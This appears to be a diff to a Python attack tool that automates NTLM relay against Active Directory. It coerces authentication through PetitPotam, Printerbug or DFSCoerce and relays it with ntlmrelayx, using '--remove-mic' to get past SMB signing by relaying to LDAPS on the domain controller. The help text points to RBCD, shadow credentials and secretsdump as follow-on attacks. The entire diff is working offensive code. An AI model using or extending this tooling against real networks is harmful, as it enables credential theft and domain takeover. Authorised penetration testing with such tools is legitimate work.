@@ -432,14 +432,11 @@ def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False
         log("SMB", "ok", "Port 445 is free on attacker (good)", C.GREEN)
 
     if smb_signing:
-        if not ensure_forked_impacket():
-            sys.exit(1)
-
         ldaps_target = dc_ip or dc_fqdn or dns_ip
         if not ldaps_target.startswith("ldaps://"):
             ldaps_target = f"ldaps://{ldaps_target}"
 
-        log("RELAY", ">>", f"Mode: {C.MAG}{C.BOLD}SMB signing bypass (--remove-mic-partial){C.RST}")
+        log("RELAY", ">>", f"Mode: {C.MAG}{C.BOLD}SMB signing bypass (--remove-mic){C.RST}")
         log("RELAY", ">>", f"Relay target: {C.BOLD}{ldaps_target}{C.RST} (LDAPS)")
         log("LDAP", "..", "Relay will forward captured NTLM auth to DC over LDAPS")
 
@@ -451,10 +448,17 @@ def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False
             log("LDAP", "!!", f"{ldaps_host}:636 (LDAPS) is NOT reachable", C.RED)
             log_result("LDAPS reachability", False, f"{ldaps_host}:636 closed")
 
+        relay_bin = find_ntlmrelayx()
+        if not relay_bin:
+            log("FAIL", "!!", "No ntlmrelayx binary found on PATH", C.RED)
+            log_result("ntlmrelayx binary", False, "not found")
+            sys.exit(1)
+        log("SMB", "ok", f"Using relay binary: {relay_bin}")
+
         cmd = [
-            "ntlmrelayx.py", "-t", ldaps_target,
+            relay_bin, "-t", ldaps_target,
             "--no-multirelay", "-i", "-smb2support",
-            "--remove-mic-partial", "--keep-relaying"
+            "--remove-mic", "--keep-relaying"
         ]
     else:
         log("RELAY", ">>", f"Mode: {C.BLUE}{C.BOLD}Standard SMB relay{C.RST}")
@@ -701,8 +705,8 @@ def main():
                              "secretsdump. Use with proxychains for manual exploration.")
     parser.add_argument("--smb-signing-is-on", action="store_true",
                         help="When the relay target has SMB signing ON, this switches to relaying to LDAPS on the DC "
-                             "using forked impacket (--remove-mic-partial). From LDAPS you can set up RBCD or shadow "
-                             "credentials. Leave this off for standard SMB relay with secretsdump.")
+                             "using --remove-mic to strip the MIC from the NTLM exchange. From LDAPS you can set up "
+                             "RBCD or shadow credentials. Leave this off for standard SMB relay with secretsdump.")
     parser.add_argument("-M", "--method", default="PetitPotam",
                         choices=["PetitPotam", "Printerbug", "DFSCoerce"])
     parser.add_argument("--capture", action="store_true", help="Run tcpdump in background for pcap analysis")
